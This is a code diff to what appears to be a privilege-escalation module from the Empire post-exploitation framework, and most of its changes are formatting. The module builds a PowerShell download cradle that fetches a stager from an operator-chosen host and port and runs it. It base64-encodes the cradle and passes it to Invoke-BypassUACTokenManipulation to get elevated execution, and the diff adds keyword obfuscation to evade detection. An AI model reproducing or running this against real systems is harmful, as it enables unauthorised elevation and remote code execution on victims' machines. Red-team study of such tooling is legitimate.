@@ -1,9 +1,13 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-from lib.common import helpers
+
 import base64
 import re
+from builtins import object
+from builtins import str
+
+from lib.common import helpers
+
+
 
 class Module(object):
 
@@ -18,7 +22,8 @@ class Module(object):
             'Author': ['@enigma0x3,@424f424f'],
 
             # More verbose multi-line description of the module
-            'Description': ('Bypass UAC module based on the script released by Matt Nelson @enigma0x3 at Derbycon 2017'),
+            'Description': (
+                'Bypass UAC module based on the script released by Matt Nelson @enigma0x3 at Derbycon 2017'),
 
             'Software': '',
 
@@ -53,40 +58,40 @@ class Module(object):
         self.options = {
 
             'Agent': {
-                'Description':   'Agent to elevate from.',
-                'Required'   :   True,
-                'Value'      :   ''
+                'Description': 'Agent to elevate from.',
+                'Required': True,
+                'Value': ''
             },
             'Stager': {
-                'Description':   'Stager file that you have hosted.',
-                'Required'   :   True,
-                'Value'      :   'update.php'
+                'Description': 'Stager file that you have hosted.',
+                'Required': True,
+                'Value': 'update.php'
             },
             'Host': {
-                'Description':   'Host or IP where stager is served.',
-                'Required'   :   True,
-                'Value'      :   ''
+                'Description': 'Host or IP where stager is served.',
+                'Required': True,
+                'Value': ''
             },
             'UserAgent': {
-                'Description':   'UserAgent for staging process',
-                'Required'   :   False,
-                'Value'      :   'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
+                'Description': 'UserAgent for staging process',
+                'Required': False,
+                'Value': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
             },
             'Port': {
-                'Description':   'Port to connect to where stager is served',
-                'Required'   :   True,
-                'Value'      :   ''
+                'Description': 'Port to connect to where stager is served',
+                'Required': True,
+                'Value': ''
             },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
+            'Proxy': {
+                'Description': 'Proxy to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
             },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            } 
+            'ProxyCreds': {
+                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required': False,
+                'Value': 'default'
+            }
 
         }
 
@@ -105,14 +110,13 @@ class Module(object):
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
         stager = self.options['Stager']['Value']
         host = self.options['Host']['Value']
         userAgent = self.options['UserAgent']['Value']
         port = self.options['Port']['Value']
- 
+
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/Invoke-BypassUACTokenManipulation.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
@@ -143,12 +147,11 @@ class Module(object):
         #
         # script += """
 
-             
         try:
             blank_command = ""
             powershell_command = ""
-            encodedCradle = ""
-            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host,port,stager)
+            encoded_cradle = ""
+            cradle = "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX" % (host, port, stager)
             # Remove weird chars that could have been added by ISE
             n = re.compile(u'(\xef|\xbb|\xbf)')
             # loop through each character and insert null byte
@@ -158,14 +161,18 @@ class Module(object):
             # assign powershell command as the new one
             powershell_command = blank_command
             # base64 encode the powershell command
-            
-           
-            encodedCradle = base64.b64encode(powershell_command)
-            
+
+            encoded_cradle = base64.b64encode(powershell_command)
+
         except Exception as e:
             pass
+
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-        scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encodedCradle)
+            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
+                                          obfuscationCommand=obfuscationCommand)
+        scriptEnd = "Invoke-BypassUACTokenManipulation -Arguments \"-w 1 -enc %s\"" % (encoded_cradle)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
+
